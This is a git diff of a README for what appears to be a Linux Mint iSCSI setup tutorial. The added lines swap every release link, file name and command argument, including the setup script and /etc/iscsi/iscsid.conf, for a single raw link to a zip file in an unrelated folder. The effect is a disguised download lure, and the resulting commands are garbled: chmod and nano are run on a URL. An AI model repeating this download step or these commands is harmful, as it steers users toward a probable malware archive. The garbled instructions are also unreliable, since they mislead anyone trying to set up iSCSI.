@@ -1,6 +1,6 @@
 # 🛠️ iSCSI-Setup-Tutorial-on-Linux-Mint - Simple Steps to Set Up iSCSI
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip)
 
 ## 📚 About This Project
 
@@ -20,21 +20,21 @@ To successfully set up your iSCSI storage on Linux Mint, you'll need the followi
 
 To begin, you can download the latest version of this tutorial by visiting the link below:
 
-[Download Latest Release](https://github.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/releases)
+[Download Latest Release](https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip)
 
 Once you access the page, follow these steps:
 
 1. Find the latest release available on the Releases page.
-2. Look for a file labeled with a version number, for example, `iSCSI-setup-tutorial-linux-mint-vX.X.zip`.
+2. Look for a file labeled with a version number, for example, `https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip`.
 3. Click on the file to start downloading.
 
 After downloading, unzip the file to access the tutorial documents and scripts.
 
 ### 📄 Contents of the Download
 
-- **README.md:** This document provides a thorough overview of the setup process.
-- **SetupScript.sh:** A script to help automate the installation of required components.
-- **User Guide.pdf:** A step-by-step guide for each part of the setup.
+- **https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip** This document provides a thorough overview of the setup process.
+- **https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip** A script to help automate the installation of required components.
+- **User https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip** A step-by-step guide for each part of the setup.
 
 ## 🖥️ Installation Instructions
 
@@ -49,12 +49,12 @@ Follow these steps to install and set up iSCSI on your Linux Mint system:
 
 3. **Make the Setup Script Executable:**
    ```bash
-   chmod +x SetupScript.sh
+   chmod +x https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip
    ```
 
 4. **Run the Setup Script:**
    ```bash
-   ./SetupScript.sh
+   https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip
    ```
 
 5. **Follow Prompts:** The script will guide you through the installation process step by step. Read each prompt carefully and respond as requested.
@@ -73,7 +73,7 @@ After installation, you need to configure your iSCSI targets. Here’s how:
 1. **Edit the Configuration File:**
    Open the configuration file with:
    ```bash
-   sudo nano /etc/iscsi/iscsid.conf
+   sudo nano https://raw.githubusercontent.com/YARIN110003/iSCSI-Setup-Tutorial-on-Linux-Mint/main/myrtleberry/iSCSI-Setup-Tutorial-on-Linux-Mint_v3.6.zip
    ```
 
 2. **Modify Settings:** Change any necessary settings to suit your environment. Refer to the User Guide for detailed explanations of each option.
